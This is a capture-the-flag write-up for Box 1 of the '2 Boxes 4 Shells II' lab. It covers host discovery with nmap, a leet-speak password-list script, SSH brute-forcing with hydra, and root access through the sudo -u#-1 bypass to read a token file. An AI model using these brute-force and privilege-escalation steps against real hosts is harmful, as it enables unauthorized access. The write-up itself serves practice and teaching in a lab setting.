# 2 Boxes 4 Shells II

## Initial Discovery
### Background
A token is located in a user directory (/home/[UserID]/) and the root directory (/root/) of 2 boxes. Gather all 4 tokens only if ... you're elite\
This challenge is completely unique and no advantage is given to challengers that successfully completed last round's 2 Boxes 4 Shells.

### Getting Started
2 rogue boxes are located on the 192.168.86.0/24 network, specifically between .200-.254. Box 1 is the lower IP address and Box 2 is the higher. Identify the 2 boxes' IPs in /24 network, scan hosts identified, access, analyze, exploit, and grab as many tokens as you can.

Note: 192.168.86.2 is a DHCP server that can be ignored

Run nmap scan to discover hosts on the network
`nmap -sn 192.168.86.0/24`

Identify the two boxes in the 200's

## Box 1 User
Run nmap against the box 1:\
`nmap -n -Pn --open -T4 -sT -sV 192.168.86.236 `

Notice that ports 22, 80, and 443 are open. Keep these in mind for later.

Visit the website and see that it is a log-in page

you can right click any of the login fields and inspect them (looking to see if any js contains creds)

when I scrolled to the bottom of webdev tools I seen a comment saying this image could help
<!--Image will help get invite link-->

so I copied the image link and put it in the url

that gave me a B64 image indicating the image name is in base64

so decode the file name and it gave a sign up link

paste the sign up link in the url and created my own account

read the chats and see there is a hint saying the user/pass dsmith:deion3 was changed so that deion was now leet speak, 3 was replaced with a hockey number, and a special charater (!@#$%^&) was added at the end.

Created the following script to generate a password file:
```
#!/bin/bash

special_characters="!@#$%^&"
leet_names=("d3i0n" "d310n" "dei0n" "d3ion" "de10n" "de1on")

for name in "${leet_names[@]}"; do
    for number in {0..99}; do
        for char in $(echo $special_characters | sed 's/./& /g'); do
            password="${name}${number}${char}"
            echo "$password"
    	done
    done
done
```

`./script.sh > pass.txt`

`hydra -l dsmith -P pass.txt 192.168.86.236 ssh`

login with cracked password

`cat token1.txt`

Box 1 User Flag:\
Blue Blazes


## Box 1 Root
Once in, see what dsmith can use sudo for:

`sudo -l`

grep is the only thing he can use

`sudo -V` 

this box is using a vulnerable sudo version

the first flag was token1 so we can assume the next is token2

run this to see full file contents with grep

`sudo -u#-1 grep --color -E "test|$" /root/token2.txt`

Box 1 Root Token:\
Blue Bombers

